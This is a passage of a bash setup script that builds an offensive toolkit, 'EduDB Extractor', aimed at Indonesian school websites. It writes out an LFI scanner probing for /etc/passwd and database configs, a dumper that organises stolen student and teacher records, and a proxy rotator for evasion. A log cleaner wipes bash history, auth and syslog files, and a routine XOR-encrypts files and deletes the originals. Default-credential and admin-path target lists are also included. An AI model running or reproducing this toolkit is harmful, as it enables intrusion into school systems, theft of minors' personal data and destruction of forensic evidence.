    def test_parameter_lfi(self, url, parameter):
        results = []
        
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        existing_params = {}
        if parsed.query:
            for pair in parsed.query.split('&'):
                if '=' in pair:
                    key, value = pair.split('=', 1)
                    existing_params[key] = value
        
        for payload in self.lfi_payloads[:5]:
            test_params = existing_params.copy()
            test_params[parameter] = payload
            
            query_string = '&'.join([f"{k}={quote(v)}" for k, v in test_params.items()])
            test_url = f"{base_url}?{query_string}"
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                is_vulnerable, evidence = self.check_lfi_response(response, payload)
                
                if is_vulnerable:
                    result = {
                        'url': test_url,
                        'parameter': parameter,
                        'payload': payload,
                        'vulnerable': True,
                        'evidence': evidence
                    }
                    results.append(result)
                    print(f"  [✓] LFI Found: {payload[:50]}...")
                    
                    break
            
            except Exception as e:
                print(f"  [!] Error: {e}")
        
        return results
    
    def check_lfi_response(self, response, payload):
        content = response.text
        
        if 'etc/passwd' in payload:
            if 'root:' in content and 'daemon:' in content:
                return True, "Found /etc/passwd content"
        
        if 'database.php' in payload:
            if 'DB_HOST' in content or 'DB_NAME' in content:
                return True, "Found database configuration"
        
        error_messages = ['failed to open stream', 'no such file', 'warning: include']
        for error in error_messages:
            if error in content.lower():
                return True, f"Error: {error}"
        
        return False, "No LFI indicators"
EOF
print_success "Created: exploit/lfi_scanner.py"

# 8. extract/db_dumper.py
cat > extract/db_dumper.py << 'EOF'
#!/usr/bin/env python3
# extract/db_dumper.py - Database Dumper Module
import json
import csv
import sqlite3
from datetime import datetime

class DBDumper:
    def __init__(self, proxy_rotator=None):
        self.proxy_rotator = proxy_rotator
        
    def save_to_json(self, data, filename):
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            return True
        except Exception as e:
            print(f"Error saving JSON: {e}")
            return False
    
    def save_to_csv(self, data, filename):
        if not data:
            return False
        
        try:
            fieldnames = set()
            for row in data:
                fieldnames.update(row.keys())
            
            with open(filename, 'w', newline='', encoding='utf-8') as f:
                writer = csv.DictWriter(f, fieldnames=list(fieldnames))
                writer.writeheader()
                writer.writerows(data)
            
            return True
        except Exception as e:
            print(f"Error saving CSV: {e}")
            return False
    
    def organize_student_data(self, raw_data):
        students = []
        
        for table_name, table_data in raw_data.items():
            for row in table_data:
                student = {}
                
                for key, value in row.items():
                    key_lower = key.lower()
                    value_str = str(value)
                    
                    if 'nis' in key_lower or 'id' in key_lower:
                        if value_str.isdigit() and len(value_str) > 5:
                            student['nis'] = value_str
                    
                    if 'nama' in key_lower or 'name' in key_lower:
                        student['nama'] = value_str
                    
                    if 'kelas' in key_lower or 'class' in key_lower:
                        student['kelas'] = value_str
                
                if student:
                    students.append(student)
        
        return students
    
    def organize_teacher_data(self, raw_data):
        teachers = []
        
        for table_name, table_data in raw_data.items():
            for row in table_data:
                teacher = {}
                
                for key, value in row.items():
                    key_lower = key.lower()
                    value_str = str(value)
                    
                    if 'nip' in key_lower or 'id' in key_lower:
                        teacher['nip'] = value_str
                    
                    if 'nama' in key_lower or 'name' in key_lower:
                        teacher['nama'] = value_str
                    
                    if 'mapel' in key_lower or 'subject' in key_lower:
                        teacher['mata_pelajaran'] = value_str
                
                if teacher:
                    teachers.append(teacher)
        
        return teachers
    
    def generate_report(self, extracted_data, output_dir='reports'):
        import os
        
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        report = {
            'generated_date': datetime.now().isoformat(),
            'summary': {},
            'data_types': {}
        }
        
        student_data = self.organize_student_data(extracted_data)
        teacher_data = self.organize_teacher_data(extracted_data)
        
        report['summary']['total_tables'] = len(extracted_data)
        report['summary']['total_students'] = len(student_data)
        report['summary']['total_teachers'] = len(teacher_data)
        
        if student_data:
            self.save_to_json(student_data, f'{output_dir}/students.json')
            self.save_to_csv(student_data, f'{output_dir}/students.csv')
            report['data_types']['students'] = len(student_data)
        
        if teacher_data:
            self.save_to_json(teacher_data, f'{output_dir}/teachers.json')
            self.save_to_csv(teacher_data, f'{output_dir}/teachers.csv')
            report['data_types']['teachers'] = len(teacher_data)
        
        report_file = f'{output_dir}/extraction_report.json'
        self.save_to_json(report, report_file)
        
        print(f"\n[📊] EXTRACTION REPORT")
        print("="*40)
        print(f"Total tables extracted: {report['summary']['total_tables']}")
        print(f"Student records: {report['summary']['total_students']}")
        print(f"Teacher records: {report['summary']['total_teachers']}")
        print(f"Report saved to: {report_file}")
        print("="*40)
        
        return report
EOF
print_success "Created: extract/db_dumper.py"

# 9. extract/table_extractor.py
cat > extract/table_extractor.py << 'EOF'
#!/usr/bin/env python3
# extract/table_extractor.py - Table Extraction Module
# Integrated in sql_injector.py

def extract_table_data(injector, url, parameter, table_name):
    """
    Ekstrak data dari tabel tertentu
    Fungsi diimplementasi dalam sql_injector.py.dump_table()
    """
    return injector.dump_table(url, parameter, table_name)
EOF
print_success "Created: extract/table_extractor.py"

# 10. extract/data_parser.py
cat > extract/data_parser.py << 'EOF'
#!/usr/bin/env python3
# extract/data_parser.py - Data Parser Module
# Integrated in db_dumper.py

def parse_extracted_data(raw_data):
    """
    Parse data yang sudah diekstrak
    Fungsi diimplementasi dalam db_dumper.py.organize_student_data() dll
    """
    return "Integrated in db_dumper.py"
EOF
print_success "Created: extract/data_parser.py"

# 11. analyze/data_analyzer.py
cat > analyze/data_analyzer.py << 'EOF'
#!/usr/bin/env python3
# analyze/data_analyzer.py - Data Analysis Module
# Functions in main.py & db_dumper.py

def analyze_extracted_data(extracted_data):
    """
    Analisis data yang sudah diekstrak
    Fungsi ada di main.py.generate_data_report() dan db_dumper.py.generate_report()
    """
    return "Functions in main.py and db_dumper.py"
EOF
print_success "Created: analyze/data_analyzer.py"

# 12. analyze/report_generator.py
cat > analyze/report_generator.py << 'EOF'
#!/usr/bin/env python3
# analyze/report_generator.py - Report Generator
# Integrated in db_dumper.py

def generate_extraction_report(extracted_data, output_dir):
    """
    Generate report ekstraksi data
    Fungsi diimplementasi dalam db_dumper.py.generate_report()
    """
    return "Integrated in db_dumper.py"
EOF
print_success "Created: analyze/report_generator.py"

# 13. analyze/data_visualizer.py
cat > analyze/data_visualizer.py << 'EOF'
#!/usr/bin/env python3
# analyze/data_visualizer.py - Data Visualization Module
import json
import os
import matplotlib.pyplot as plt

class DataVisualizer:
    def __init__(self, output_dir='visualizations'):
        self.output_dir = output_dir
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
    
    def plot_student_distribution(self, student_data, save=True):
        if not student_data:
            print("[!] No student data to visualize")
            return None
        
        classes = {}
        for student in student_data:
            if isinstance(student, dict):
                kelas = student.get('kelas', student.get('class', 'Unknown'))
                if kelas:
                    if kelas in classes:
                        classes[kelas] += 1
                    else:
                        classes[kelas] = 1
        
        if not classes:
            return None
        
        sorted_classes = dict(sorted(classes.items()))
        
        plt.figure(figsize=(12, 6))
        bars = plt.bar(sorted_classes.keys(), sorted_classes.values(), color='skyblue')
        
        for bar in bars:
            height = bar.get_height()
            plt.text(bar.get_x() + bar.get_width()/2., height + 0.1,
                    f'{int(height)}', ha='center', va='bottom')
        
        plt.title('Student Distribution by Class', fontsize=16)
        plt.xlabel('Class')
        plt.ylabel('Number of Students')
        plt.xticks(rotation=45, ha='right')
        plt.tight_layout()
        
        if save:
            filename = f"{self.output_dir}/student_distribution.png"
            plt.savefig(filename, dpi=300, bbox_inches='tight')
            print(f"[✓] Saved: {filename}")
            plt.close()
            return filename
        else:
            plt.show()
            return None
    
    def create_grade_chart(self, student_data, save=True):
        if not student_data:
            return None
        
        grades = {'A (90-100)': 0, 'B (80-89)': 0, 'C (70-79)': 0, 'D (60-69)': 0, 'E (0-59)': 0}
        
        for student in student_data:
            if isinstance(student, dict):
                for key, value in student.items():
                    key_lower = key.lower()
                    if 'nilai' in key_lower or 'grade' in key_lower:
                        if isinstance(value, (int, float)):
                            if value >= 90:
                                grades['A (90-100)'] += 1
                            elif value >= 80:
                                grades['B (80-89)'] += 1
                            elif value >= 70:
                                grades['C (70-79)'] += 1
                            elif value >= 60:
                                grades['D (60-69)'] += 1
                            else:
                                grades['E (0-59)'] += 1
        
        plt.figure(figsize=(10, 8))
        
        colors = ['#4CAF50', '#8BC34A', '#FFC107', '#FF9800', '#F44336']
        
        wedges, texts, autotexts = plt.pie(
            grades.values(),
            labels=grades.keys(),
            colors=colors,
            autopct='%1.1f%%',
            startangle=90
        )
        
        plt.title('Grade Distribution', fontsize=16)
        plt.axis('equal')
        
        if save:
            filename = f"{self.output_dir}/grade_distribution.png"
            plt.savefig(filename, dpi=300, bbox_inches='tight')
            print(f"[✓] Saved: {filename}")
            plt.close()
            return filename
        else:
            plt.show()
            return None
    
    def generate_dashboard(self, extracted_data):
        dashboard_files = []
        
        if 'students' in extracted_data or 'student_data' in extracted_data:
            student_data = extracted_data.get('students', extracted_data.get('student_data', []))
            if student_data:
                dist_file = self.plot_student_distribution(student_data)
                if dist_file:
                    dashboard_files.append(('Student Distribution', dist_file))
        
        if 'grades' in extracted_data or 'student_data' in extracted_data:
            grade_data = extracted_data.get('grades', extracted_data.get('student_data', []))
            if grade_data:
                grade_file = self.create_grade_chart(grade_data)
                if grade_file:
                    dashboard_files.append(('Grade Distribution', grade_file))
        
        self.generate_html_dashboard(dashboard_files)
        
        return dashboard_files
    
    def generate_html_dashboard(self, visualization_files):
        from datetime import datetime
        
        html_content = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>School Data Visualization Dashboard</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 20px; }
                .container { max-width: 1200px; margin: 0 auto; }
                .header { text-align: center; margin-bottom: 30px; }
                .viz-container { display: flex; flex-wrap: wrap; gap: 20px; }
                .viz-card { flex: 1 1 500px; border: 1px solid #ddd; padding: 15px; border-radius: 5px; }
                .viz-card img { width: 100%; height: auto; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>School Data Visualization Dashboard</h1>
                    <p>Generated on """ + datetime.now().strftime('%Y-%m-%d %H:%M:%S') + """</p>
                </div>
                <div class="viz-container">
        """
        
        for title, filepath in visualization_files:
            filename = os.path.basename(filepath)
            html_content += f"""
                    <div class="viz-card">
                        <h3>{title}</h3>
                        <img src="{filename}" alt="{title}">
                    </div>
            """
        
        html_content += """
                </div>
            </div>
        </body>
        </html>
        """
        
        html_file = f"{self.output_dir}/dashboard.html"
        with open(html_file, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print(f"[✓] Dashboard saved: {html_file}")
        return html_file
EOF
print_success "Created: analyze/data_visualizer.py"

# 14. stealth/proxy_rotator.py
cat > stealth/proxy_rotator.py << 'EOF'
#!/usr/bin/env python3
# stealth/proxy_rotator.py - Proxy Rotation Module
import requests
import random
import time
from concurrent.futures import ThreadPoolExecutor

class ProxyRotator:
    def __init__(self, proxy_file='proxies.txt'):
        self.proxies = self.load_proxies(proxy_file)
        self.working_proxies = []
        self.failed_proxies = []
        
    def load_proxies(self, filename):
        proxies = []
        try:
            with open(filename, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        proxies.append(line)
        except:
            proxies = [
                'http://45.77.56.113:3128',
                'http://138.197.157.32:8080',
                'http://165.227.109.115:80'
            ]
        return proxies
    
    def validate_proxies(self):
        print("[+] Validating proxies...")
        
        def test_proxy(proxy):
            try:
                proxies = {'http': proxy, 'https': proxy}
                response = requests.get('http://httpbin.org/ip', proxies=proxies, timeout=5)
                if response.status_code == 200:
                    return proxy
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            results = executor.map(test_proxy, self.proxies)
            
            for proxy, result in zip(self.proxies, results):
                if result:
                    self.working_proxies.append(proxy)
                    print(f"  [✓] {proxy}")
                else:
                    self.failed_proxies.append(proxy)
                    print(f"  [✗] {proxy}")
        
        print(f"\n[+] Working proxies: {len(self.working_proxies)}/{len(self.proxies)}")
        return self.working_proxies
    
    def get_proxy(self):
        if not self.working_proxies:
            self.validate_proxies()
        
        if not self.working_proxies:
            return None
        
        return random.choice(self.working_proxies)
    
    def get_stats(self):
        return {
            'total': len(self.proxies),
            'working': len(self.working_proxies),
            'failed': len(self.failed_proxies)
        }
EOF
print_success "Created: stealth/proxy_rotator.py"

# 15. stealth/request_spoofer.py
cat > stealth/request_spoofer.py << 'EOF'
#!/usr/bin/env python3
# stealth/request_spoofer.py - Request Spoofing Module
# Integrated in school_scanner.py

def spoof_request_headers():
    """
    Spoof request headers untuk menghindari deteksi
    Fungsi diimplementasi dalam school_scanner.py
    """
    return "Integrated in school_scanner.py"
EOF
print_success "Created: stealth/request_spoofer.py"

# 16. stealth/log_cleaner.py
cat > stealth/log_cleaner.py << 'EOF'
#!/usr/bin/env python3
# stealth/log_cleaner.py - Log Cleaning Module
import os
import random
import string
import shutil

class LogCleaner:
    def __init__(self):
        self.temp_files = []
    
    def clear_bash_history(self, user=None):
        try:
            if user is None:
                history_file = os.path.expanduser('~/.bash_history')
            else:
                history_file = f"/home/{user}/.bash_history"
            
            if os.path.exists(history_file):
                with open(history_file, 'w') as f:
                    f.write('')
                return {'success': True, 'file': history_file}
            
            return {'success': False, 'error': 'History file not found'}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def clean_system_logs(self, log_types=None):
        if log_types is None:
            log_types = ['auth', 'syslog']
        
        results = []
        
        for log_type in log_types:
            try:
                if log_type == 'auth':
                    result = self.clean_auth_logs()
                elif log_type == 'syslog':
                    result = self.clean_syslog()
                else:
                    result = {'success': False, 'error': f'Unknown log type: {log_type}'}
                
                results.append({
                    'log_type': log_type,
                    **result
                })
                
            except Exception as e:
                results.append({
                    'log_type': log_type,
                    'success': False,
                    'error': str(e)
                })
        
        return results
    
    def clean_auth_logs(self):
        auth_logs = [
            '/var/log/auth.log',
            '/var/log/secure'
        ]
        
        cleared = []
        
        for log_file in auth_logs:
            if os.path.exists(log_file):
                try:
                    with open(log_file, 'w') as f:
                        f.write('')
                    cleared.append(log_file)
                except:
                    pass
        
        return {
            'success': len(cleared) > 0,
            'files_cleared': cleared
        }
    
    def clean_syslog(self):
        sys_logs = [
            '/var/log/syslog',
            '/var/log/messages'
        ]
        
        cleared = []
        
        for log_file in sys_logs:
            if os.path.exists(log_file):
                try:
                    with open(log_file, 'w') as f:
                        f.write('')
                    cleared.append(log_file)
                except:
                    pass
        
        return {
            'success': len(cleared) > 0,
            'files_cleared': cleared
        }
    
    def encrypt_sensitive_files(self, filepaths, password=None):
        if not password:
            password = self.generate_strong_password()
        
        encrypted_files = []
        
        for filepath in filepaths:
            if os.path.exists(filepath):
                try:
                    encrypted_path = self.xor_encrypt_file(filepath, password)
                    if encrypted_path:
                        encrypted_files.append({
                            'original': filepath,
                            'encrypted': encrypted_path,
                            'status': 'success'
                        })
                        
                        os.remove(filepath)
                    else:
                        encrypted_files.append({
                            'original': filepath,
                            'status': 'failed'
                        })
                        
                except Exception as e:
                    encrypted_files.append({
                        'original': filepath,
                        'status': 'error',
                        'error': str(e)
                    })
        
        return {
            'encrypted_count': len([f for f in encrypted_files if f['status'] == 'success']),
            'password': password,
            'files': encrypted_files
        }
    
    def xor_encrypt_file(self, filepath, password):
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            
            key = password.encode()
            key_length = len(key)
            
            encrypted = bytearray()
            for i, byte in enumerate(data):
                encrypted.append(byte ^ key[i % key_length])
            
            encrypted_path = filepath + '.enc'
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted)
            
            return encrypted_path
            
        except Exception as e:
            print(f"XOR encryption failed: {e}")
            return None
    
    def generate_strong_password(self, length=32):
        chars = string.ascii_letters + string.digits + string.punctuation
        return ''.join(random.choice(chars) for _ in range(length))
    
    def clean_temporary_files(self):
        cleaned = []
        
        temp_dirs = ['/tmp', '/var/tmp']
        
        import glob
        patterns = ['edudb_*', 'school_scan_*', 'dump_*', '*.json.tmp']
        
        for temp_dir in temp_dirs:
            if os.path.exists(temp_dir):
                for pattern in patterns:
                    for filepath in glob.glob(os.path.join(temp_dir, pattern)):
                        try:
                            if os.path.isfile(filepath):
                                os.remove(filepath)
                                cleaned.append(filepath)
                        except:
                            pass
        
        for temp_file in self.temp_files:
            if os.path.exists(temp_file):
                try:
                    os.remove(temp_file)
                    cleaned.append(temp_file)
                except:
                    pass
        
        self.temp_files.clear()
        
        return {
            'cleaned_count': len(cleaned),
            'cleaned_files': cleaned[:10]
        }
EOF
print_success "Created: stealth/log_cleaner.py"

# 17. targets/common_school_cms.txt
cat > targets/common_school_cms.txt << 'EOF'
# Common Indonesian School Management Systems
SIAKAD - Sistem Informasi Akademik
SIMPEG - Sistem Informasi Kepegawaian
SIMPONI - Sistem Informasi Monitoring
DAPODIK - Data Pokok Pendidikan
e-Rapor - Rapor Digital
SIPLah - Sistem Informasi Pengadaan
SCHOOLPRESS - WordPress for Schools
OPENSIS - Open Source Student System
FEDENA - School ERP System
GIBBON - School Platform
EOF
print_success "Created: targets/common_school_cms.txt"

# 18. targets/default_credentials.txt
cat > targets/default_credentials.txt << 'EOF'
# Default credentials for school systems
admin:admin
admin:password
admin:123456
administrator:admin
superadmin:superadmin
admin:sekolah
admin:school
guru:guru
siswa:siswa
kepsek:kepsek
operator:operator
user:user
demo:demo
test:test
EOF
print_success "Created: targets/default_credentials.txt"

# 19. targets/school_paths.txt
cat > targets/school_paths.txt << 'EOF'
# Common school website paths
/admin
/login
/siswa
/guru
/nilai
/rapor
/akademik
/keuangan
/absensi
/laporan
/data
/export
/report
/daftar
/registrasi
/pendaftaran
/informasi
/pengumuman
/berita
/agenda
/galeri
/download
/upload
/backup
/database
/phpmyadmin
EOF
print_success "Created: targets/school_paths.txt"

# Create proxies.txt with example proxies
cat > proxies.txt << 'EOF'
# Example proxies (replace with your own or find free ones)
# http://proxy1:port
# http://proxy2:port
# http://proxy3:port

# Free public proxies (may not work, replace with working ones)
http://45.77.56.113:3128
http://138.197.157.32:8080
http://165.227.109.115:80
EOF
print_success "Created: proxies.txt"

# Create requirements.txt
cat > requirements.txt << 'EOF'
# Python dependencies for EduDB Extractor
requests>=2.28.0
beautifulsoup4>=4.11.0
matplotlib>=3.5.0
pandas>=1.5.0
cryptography>=38.0.0
pycryptodome>=3.17.0
colorama>=0.4.6
tqdm>=4.64.0
argparse>=1.4.0
EOF
print_success "Created: requirements.txt"

# Create README.md
cat > README.md << 'EOF'
# 🎓 EduDB Extractor Toolkit

Advanced school database extraction and analysis system.

## 🚀 Features
- **Reconnaissance**: School website scanning and CMS detection
- **Exploitation**: SQL injection, authentication bypass, LFI scanning
- **Extraction**: Database dumping and data parsing
- **Analysis**: Data visualization and reporting
- **Stealth**: Proxy rotation and log cleaning

## 📦 Installation

### Quick Start
```bash
# Make setup script executable
chmod +x setup.sh

# Run setup
./setup.sh
